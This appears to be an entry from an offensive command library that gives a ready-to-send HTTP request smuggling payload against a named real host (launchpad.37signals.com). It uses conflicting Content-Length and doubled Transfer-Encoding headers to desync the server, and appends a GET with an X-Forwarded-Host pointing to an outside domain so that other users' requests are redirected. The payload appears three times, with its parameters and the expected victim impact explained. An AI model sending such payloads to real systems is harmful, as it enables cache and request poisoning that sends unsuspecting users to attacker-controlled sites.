---
data: |-
  POST /identity HTTP/1.1
  Host: launchpad.37signals.com
  Content-Length: 69
  Connection: keep-alive
  Content-Type: application/x-www-form-urlencoded
  Transfer-Encoding: chunked
  Transfer-Encoding: foo

  213
  x=1
  0

  GET / HTTP/1.1
  X-Forwarded-Host: hazimaslam.com
  Foo: bar
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Web
id: ae457804-e637-4ded-a1c9-0252026a58ba
created_at: '2025-12-13T09:01:21.709Z'
updated_at: '2025-12-13T09:01:21.709Z'
verified: false
validated: true
submitted: true
---
# http-smuggling-post-desync-redirection

## Command

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar
```

## Description

Sends a desync HTTP POST request to exploit smuggling, appending a GET that redirects to a malicious domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Content-Length` | Specifies the length of the request body as 69 | Yes |
| `X-Forwarded-Host` | Sets host to hazimaslam.com for redirection | Yes |
| `Transfer-Encoding` | chunked (valid) followed by foo (invalid) to cause desync | Yes |

## Examples

### Basic Usage

```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 69
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

GET / HTTP/1.1
X-Forwarded-Host: hazimaslam.com
Foo: bar
```

## Expected Output

One of the subsequent victim requests gets redirected to hazimaslam.com.

## Related

- [[procedures/Craft-and-Send-Desync-Request-for-Redirection]]
